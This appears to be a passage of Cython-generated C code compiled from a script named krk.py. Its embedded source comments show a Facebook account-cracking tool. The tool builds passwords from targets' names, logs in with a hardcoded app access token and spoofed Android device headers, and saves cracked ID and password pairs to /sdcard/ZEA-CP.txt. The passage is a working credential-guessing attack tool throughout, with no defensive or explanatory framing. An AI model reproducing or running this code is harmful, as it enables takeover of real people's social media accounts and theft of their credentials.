            __pyx_t_5 = PyNumber_Add(__pyx_t_6, __pyx_v_pas); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 470, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 470, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":471
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;34m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)             # <<<<<<<<<<<<<<
 *                                                 break
 *                         elif 'www.facebook.com' in po['error']['message']:
 */
            __pyx_t_24 = __Pyx_PyObject_Append(__pyx_v_twf, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 471, __pyx_L3_error)

            /* "krk.py":472
 *                                                 print('\r\r \033[1;34m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)
 *                                                 break             # <<<<<<<<<<<<<<
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:
 */
            goto __pyx_L18_break;

            /* "krk.py":469
 *                                         break
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r \033[1;34m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)
 */
          }

          /* "krk.py":468
 *                                         oks.append(ids)
 *                                         break
 *                         elif twf in str(po):             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;34m[ZEA-2F] '+ids+' | '+pas)
 */
          goto __pyx_L19;
        }

        /* "krk.py":473
 *                                                 twf.append(ids)
 *                                                 break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 */
        __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_error); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 473, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_message); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 473, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_5, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 473, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (__pyx_t_23) {

          /* "krk.py":474
 *                                                 break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_pcp); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 474, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_y, __pyx_t_5, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 474, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_23) {

            /* "krk.py":475
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 break
 */
            __pyx_t_5 = PyNumber_Add(__pyx_kp_s_1_36m_ZEA_CP, __pyx_v_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 475, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__68); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 475, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = PyNumber_Add(__pyx_t_6, __pyx_v_pas); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 475, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 475, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 475, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "krk.py":476
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                                 break
 *                                                 cps.append(ids)
 */
            __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 476, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 476, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 476, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_4 = PyNumber_Add(__pyx_t_6, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 476, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__63); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 476, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = NULL;
            __pyx_t_10 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
              __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_9);
              if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_9, function);
                __pyx_t_10 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_6};
              __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 476, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "krk.py":477
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 break             # <<<<<<<<<<<<<<
 *                                                 cps.append(ids)
 *                                         else:
 */
            goto __pyx_L18_break;

            /* "krk.py":474
 *                                                 break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          }

          /* "krk.py":480
 *                                                 cps.append(ids)
 *                                         else:
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                                 break
 *                                                 cps.append(ids)
 */
          /*else*/ {
            __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 480, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 480, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __pyx_t_9 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 480, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_4 = PyNumber_Add(__pyx_t_9, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 480, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __pyx_t_9 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__63); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 480, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = NULL;
            __pyx_t_10 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_10 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_9};
              __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 480, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "krk.py":481
 *                                         else:
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 break             # <<<<<<<<<<<<<<
 *                                                 cps.append(ids)
 *                         else:
 */
            goto __pyx_L18_break;
          }

          /* "krk.py":473
 *                                                 twf.append(ids)
 *                                                 break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 */
        }

        /* "krk.py":484
 *                                                 cps.append(ids)
 *                         else:
 *                                         continue             # <<<<<<<<<<<<<<
 *                 loop+=1
 *         except Exception as e:
 */
        /*else*/ {
          goto __pyx_L17_continue;
        }
        __pyx_L19:;

        /* "krk.py":391
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __pyx_L17_continue:;
      }
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L22_for_end;
      __pyx_L18_break:;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L22_for_end;
      __pyx_L22_for_end:;

      /* "krk.py":485
 *                         else:
 *                                         continue
 *                 loop+=1             # <<<<<<<<<<<<<<
 *         except Exception as e:
 *                 pass
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_loop); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 485, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_5 = __Pyx_PyInt_AddObjC(__pyx_t_7, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 485, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_5) < 0) __PYX_ERR(0, 485, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "krk.py":383
 *         loop+=1
 * def api(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
    __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "krk.py":486
 *                                         continue
 *                 loop+=1
 *         except Exception as e:             # <<<<<<<<<<<<<<
 *                 pass
 * def api1(ids,names,passlist):
 */
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_10) {
      __Pyx_AddTraceback("krk.api", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_7, &__pyx_t_6) < 0) __PYX_ERR(0, 486, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_7);
      __pyx_v_e = __pyx_t_7;
      /*try:*/ {
      }
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e); __pyx_v_e = 0;
          goto __pyx_L29;
        }
        __pyx_L29:;
      }
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":383
 *         loop+=1
 * def api(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global ok,loop,sim_id
 *                 sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "krk.py":382
 *                 time.sleep(20)
 *         loop+=1
 * def api(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_XDECREF(__pyx_t_20);
  __Pyx_AddTraceback("krk.api", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_fn);
  __Pyx_XDECREF(__pyx_v_ln);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_pas);
  __Pyx_XDECREF(__pyx_v_accessToken);
  __Pyx_XDECREF(__pyx_v_fbav);
  __Pyx_XDECREF(__pyx_v_fbbv);
  __Pyx_XDECREF(__pyx_v_android_version);
  __Pyx_XDECREF(__pyx_v_model);
  __Pyx_XDECREF(__pyx_v_build);
  __Pyx_XDECREF(__pyx_v_fblc);
  __Pyx_XDECREF(__pyx_v_fbcr);
  __Pyx_XDECREF(__pyx_v_fbmf);
  __Pyx_XDECREF(__pyx_v_fbbd);
  __Pyx_XDECREF(__pyx_v_fbdv);
  __Pyx_XDECREF(__pyx_v_fbsv);
  __Pyx_XDECREF(__pyx_v_fbca);
  __Pyx_XDECREF(__pyx_v_fbdm);
  __Pyx_XDECREF(__pyx_v_fbfw);
  __Pyx_XDECREF(__pyx_v_fbrv);
  __Pyx_XDECREF(__pyx_v_fban);
  __Pyx_XDECREF(__pyx_v_fbpn);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_random_seed);
  __Pyx_XDECREF(__pyx_v_adid);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_secure);
  __Pyx_XDECREF(__pyx_v_family);
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_sim_serials);
  __Pyx_XDECREF(__pyx_v_li);
  __Pyx_XDECREF(__pyx_v_li2);
  __Pyx_XDECREF(__pyx_v_j1);
  __Pyx_XDECREF(__pyx_v_jazoest);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_twf);
  __Pyx_XDECREF(__pyx_v_po);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_gb_3krk_3api_2generator4);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":488
 *         except Exception as e:
 *                 pass
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_17api1(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_3krk_17api1 = {"api1", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_3krk_17api1, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_3krk_17api1(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_ids = 0;
  PyObject *__pyx_v_names = 0;
  PyObject *__pyx_v_passlist = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED const Py_ssize_t __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("api1 (wrapper)", 0);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_ids,&__pyx_n_s_names,&__pyx_n_s_passlist,0};
    PyObject* values[3] = {0,0,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  3: values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_ids)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 488, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_names)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 488, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api1", 1, 3, 3, 1); __PYX_ERR(0, 488, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_passlist)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 488, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api1", 1, 3, 3, 2); __PYX_ERR(0, 488, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "api1") < 0)) __PYX_ERR(0, 488, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 3)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
      values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
      values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
    }
    __pyx_v_ids = values[0];
    __pyx_v_names = values[1];
    __pyx_v_passlist = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("api1", 1, 3, 3, __pyx_nargs); __PYX_ERR(0, 488, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("krk.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_3krk_16api1(__pyx_self, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_3krk_4api1_2generator5(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "krk.py":528
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */

static PyObject *__pyx_pf_3krk_4api1_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr *)__pyx_tp_new_3krk___pyx_scope_struct_5_genexpr(__pyx_ptype_3krk___pyx_scope_struct_5_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 528, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_3krk_4api1_2generator5, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_api1_locals_genexpr, __pyx_n_s_krk); if (unlikely(!gen)) __PYX_ERR(0, 528, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("krk.api1.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_3krk_4api1_2generator5(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr *__pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 528, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 2; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 528, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 528, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 528, __pyx_L1_error)
